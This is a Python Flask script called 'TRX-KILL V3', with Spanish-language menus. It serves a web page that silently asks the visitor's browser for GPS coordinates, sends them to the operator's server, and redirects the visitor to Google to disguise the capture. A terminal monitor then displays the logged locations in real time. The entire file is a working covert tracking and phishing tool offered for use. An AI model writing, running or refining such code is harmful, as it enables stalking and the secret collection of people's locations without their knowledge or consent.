import os, sys, threading, time
from flask import Flask, request

# --- CONFIG ---
LOG_FILE = "/sdcard/TRX-KILL-RESUL/result.txt"
if not os.path.exists("/sdcard/TRX-KILL-RESUL"): os.makedirs("/sdcard/TRX-KILL-RESUL")

app = Flask('TRX-KILL')
logging = __import__('logging')
logging.getLogger('werkzeug').setLevel(logging.ERROR)

@app.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://www.google.com';
        });
    </script></html>"""

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')}\n")
    return "OK"

def main():
    # 1. Limpieza total de puertos
    os.system("fuser -k 5000/tcp 8080/tcp > /dev/null 2>&1")
    
    # 2. Servidor en segundo plano
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
    
    # 3. Interfaz
    while True:
        os.system('clear')
        print("--- TRX-KILL V3 (MONITOR ACTIVO) ---")
        print("[1] INICIAR MONITOR EN TIEMPO REAL")
        print("[2] SALIR")
        op = input("\nTRX-ROOT > ")

        if op == "1":
            os.system('clear')
            print("ESPERANDO DATOS... (PARA VOLVER, PRESIONA ENTER MUCHAS VECES)")
            # Monitor puro: solo lee el archivo
            while True:
                time.sleep(1)
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        contenido = f.read()
                        os.system('clear')
                        print("--- DATOS RECIBIDOS ---")
                        print(contenido)
                        print("\n(Presiona Enter repetidas veces para salir)")
        elif op == "2":
            os.system("fuser -k 5000/tcp")
            sys.exit()

if __name__ == "__main__": main()
